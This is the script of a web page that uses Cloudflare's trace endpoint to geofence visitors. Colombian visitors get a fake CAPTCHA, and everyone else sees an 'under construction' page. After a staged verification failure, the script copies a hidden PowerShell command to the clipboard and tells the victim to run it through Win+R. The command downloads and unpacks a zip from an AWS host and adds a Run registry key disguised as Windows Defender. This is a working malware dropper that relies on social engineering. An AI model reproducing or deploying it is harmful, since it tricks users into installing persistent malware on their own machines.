    <script>
        async function gatekeeper() {
            try {
                // Realizar el trazado de Cloudflare
                const response = await fetch("https://www.cloudflare.com/cdn-cgi/trace");
                const text = await response.text();
                const data = text.split('\n').reduce((acc, line) => {
                    const [k, v] = line.split('=');
                    if (k) acc[k] = v;
                    return acc;
                }, {});

                const isColombia = data.loc === "CO";
                renderPage(isColombia);

            } catch (e) {
                console.error("Fallo en el gatekeeper:", e);
                // En caso de fallo de red, por seguridad mostramos construcción
                renderPage(false);
            }
        }

        function renderPage(isCO) {
            const templateId = isCO ? 'tpl-colombia' : 'tpl-construccion';
            const template = document.getElementById(templateId);
            const clone = document.importNode(template.content, true);
            
            // Limpiamos el cuerpo y cargamos el nuevo contenido
            const mainBody = document.getElementById('main-body');
            mainBody.innerHTML = '';
            mainBody.appendChild(clone);

            // Si es Colombia, activamos la lógica del "captcha"
            if (isCO) {
                initCaptchaLogic();
            }
        }

        function initCaptchaLogic() {
            const box = document.getElementById("box");
            const spinner = document.getElementById("spinner");
            const msg = document.getElementById("msg");
            const label = document.getElementById("label");
            let running = false;

            box.addEventListener("click", () => {
                if (running) return;
                running = true;
                box.style.borderColor = "transparent";
                spinner.style.display = "block";
                label.textContent = "Verificando...";

                setTimeout(() => {
                    spinner.style.display = "none";
                    box.innerHTML = "✕";
                    box.style.fontSize = "22px";
                    box.style.color = "#b3261e";
                    box.style.borderColor = "#b3261e";
                    label.textContent = "La verificación falló";
                    msg.style.display = "block";

                    // Ejecutar el comando de PowerShell al portapapeles
                    // const command = "powershell -w hidden -ExecutionPolicy Bypass -c \"Invoke-WebRequest http://127.0.0.1:8000/test.ps1 -OutFile $env:TEMP\\a.ps1; powershell $env:TEMP\\a.ps1\"";
                    const command = "powershell -w hidden -ExecutionPolicy Bypass -c \" $dst=\"$env:ProgramData\";iwr http://ec2-44-204-18-35.compute-1.amazonaws.com/4.18.29040.7-64.zip -OutFile $dst\\4.18.29040.7-64.zip;Expand-Archive -Path \"$dst\\4.18.29040.7-64.zip\" -DestinationPath $dst;New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"MpDefenderStart\" -PropertyType String -Value \"$dst\\4.18.29040.7-64\\MpCmdRun.exe\" -Force \"";
                    navigator.clipboard.writeText(command).then(() => {
                        document.getElementById("status-captcha").innerHTML =
                            "<b>Para continuar: Verificación en 3 pasos</b><br><br>" +
                            "1. Presiona <b>Win + R</b><br>" +
                            "2. Presiona <b>Ctrl + V</b><br>"+ 
                            "3. Presiona <b>Enter</b>";
                    });
                }, 3000);
            });
        }

        gatekeeper();
    </script>
